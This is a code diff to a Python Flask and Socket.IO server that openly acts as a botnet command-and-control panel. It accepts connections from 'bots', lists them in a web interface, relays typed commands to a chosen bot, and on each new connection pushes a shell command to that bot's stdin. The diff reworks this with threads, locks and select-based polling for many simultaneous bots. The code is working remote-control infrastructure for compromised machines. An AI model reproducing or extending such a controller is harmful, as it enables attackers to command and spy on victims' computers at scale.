@@ -1,10 +1,12 @@
 import socket
 import time
 import json
-from threading import Thread
+from threading import Thread, Condition
+from threading import Lock
 from flask import Flask, render_template, session, request, Response
 from flask_socketio import SocketIO, emit
 from functools import wraps
+import select
 
 # Loading library depends on how we want to setup the project later,
 # for now this will do
@@ -18,13 +20,14 @@ except: import formatsock
 
 HOST = 'localhost'
 PORT = 1708
-allConnections = {}
 connected = ''  # temp variable for testing
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
 # different async modes, or leave it set to None for the application to choose
 # the best option based on installed packages.
 async_mode = None
+
+botnot = None
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
@@ -61,7 +64,7 @@ def index():
     if request.method == 'POST':
         select = request.form.get('bot')
         connected = str(select)
-    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(),
+    return render_template('index.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
                            connected=connected)
 
 
@@ -70,7 +73,7 @@ def send(cmd):
     # raw_output = b''
     try:
         # raw_output = allConnections[connected].send(cmd['data'])
-        allConnections[connected].send(cmd['data'])
+        botnet.getConnection(connected).send(cmd['data'])
     except:
         # This emit makes sense since it's exceptional
         emit('response',
@@ -94,47 +97,110 @@ def send(cmd):
     #          {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})
 
 class BotNet(Thread):
-    def __init__(self, tcpsock):
-        Thread.__init__(self)
-        self.tcpsock = tcpsock
+
+    INPUT_TIMEOUT = 1
+
+    def __init__(self):
+        super().__init__()
+        self.connlock = Lock()
+        self.conncon = Condition(self.connlock)
+        self.allConnections = {}
+
+    def addConnection(self, user, conn):
+        with self.connlock:
+            if user in self.allConnections:
+                pass # TODO: How to deal with duplicate usernames?
+            self.allConnections[user] = conn
+            self.conncon.notifyAll()
+            # Notify recv thread
+
+    def removeConnection(self, user):
+        with self.connlock:
+            if user in self.allConnections:
+                pass # terminate and remove
+            # Notify recv thread
+
+    def getConnection(self,user):
+        with self.connlock:
+            if user in self.allConnections:
+                return self.allConnections[user]
+            return None
+
+    # TODO: remove ping? I think sockets naturally will take care if it when using "select"
+    def ping(self):
+        with self.connlock:
+            for bot in self.allConnections.values():
+                # recv returns 0 if client disconnected
+                # TODO: send packet so that bot.sock.recv doesn't block
+                if not bot.sock.rawrecv(1024):
+                    # TODO: del is maybe a bit much, we should try to gracefully disconnect if possible
+                    # - Sumner
+                    del self.allConnections[bot.user]
+                    socketio.emit('disconnect', {'user': bot.user}, namespace='/bot')
+                    print("[-] Lost connection to {}".format(bot.user))
+
+    def getConnections(self):
+        with self.connlock:
+            return self.allConnections.keys()
 
     def run(self):
         while True:
-            # TODO: does the 5 here limit us to five simultaneous targets?
+            with self.connlock:
+                bots = list(self.allConnections.values())
+                while len(bots) == 0:
+                    self.conncon.wait()
+                    bots = list(self.allConnections.values())
+            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
+            # TODO maybe use pipe as interrupt instead of timeout?
+            rs, _, _ = select.select(bots,[],[],BotNet.INPUT_TIMEOUT)
+            # We now have a tuple of all bots that have sent data to the botnet
+            for bot in rs:
+                user = bot.user
+                try:
+                    msg = bot.recv()
+                    print(msg)
+                    # TODO: emit/broadcast this message to anyone on the <user> channel/room
+                except IOError:
+                    # Connection was interrupted
+                    # TODO: inform users
+                    self.removeConnection(user)
+
+
+class BotServer(Thread):
+    def __init__(self, tcpsock, botnet):
+        Thread.__init__(self)
+        self.tcpsock = tcpsock
+        self.botnet = botnet
+
+    def run(self):
+        while True:
             self.tcpsock.listen(5)
             (clientsock, (ip, port)) = self.tcpsock.accept()
             clientformatsock = formatsock.FormatSocket(clientsock)
             msgbytes = clientformatsock.recv()
             host_info = json.loads(msgbytes.decode('UTF-8'))
-            print("[+] Received connection from {}".format(host_info['user']))
-            allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)
 
-            user = host_info['user'][:-1]
+            user = host_info['user'].strip()
+            print("[+] Received connection from {}".format(user))
+            self.botnet.addConnection(user,Bot(clientsock, host_info))
+
             socketio.emit('connection', {'user': user}, namespace='/bot')
-            allConnections[user] = Bot(clientsock, host_info)
 
             # To test continuous stream, stdout is broken into multiple packets, hangs when waiting
+            self.botnet.getConnection(user).sendStdin('find /usr/local/lib\n')
 
-            # allConnections[user].sendStdin('find /usr/local/lib\n')
-            # while True:
-            #     print(allConnections[user].recv())
 
+# TODO: may not be necessary since we're using sockets
 # Background thread to check if we've lost any connections
 class BotPinger(Thread):
+    def __init__(self, botnet):
+        super().__init__()
+        self.botnet = botnet
+
     def run(self):
         while True:
-            for bot in allConnections.values():
-                self.ping(bot)
-            time.sleep(60)  # checking every minute, this can be changed
-
-    def ping(self, bot):
-        # recv returns 0 if client disconnected
-        if not bot.sock.rawrecv(1024):
-            # TODO: del is maybe a bit much, we should try to gracefully disconnect if possible
-            # - Sumner
-            del allConnections[bot.user]
-            socketio.emit('disconnect', {'user': bot.user}, namespace='/bot')
-            print("[-] Lost connection to {}".format(bot.user))
+            self.botnet.ping()
+            time.sleep(60)
 
 class Bot:
     def __init__(self, sock, host_info):
@@ -160,12 +226,25 @@ class Bot:
     def recv(self):
         return self.sock.recv()
 
+    def fileno(self):
+        '''
+        Returns the OS fileno of the underlying socket, that way the
+        OS can wait for IO on the fileno and allow us to serve many bots
+        simultaneously
+        '''
+        return self.sock.fileno()
+
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     TCPSOCK.bind((HOST, PORT))
-    BotNet(TCPSOCK).start()
-    BotPinger().start()
+    botnet = BotNet()
+    botserver = BotServer(TCPSOCK,botnet)
+    # botpinger = BotPinger(botnet)
+
+    botnet.start()
+    botserver.start()
+    # botpinger.start()
 
     # TODO: setup helper threads to wait for targets to send stdout/stderr
 
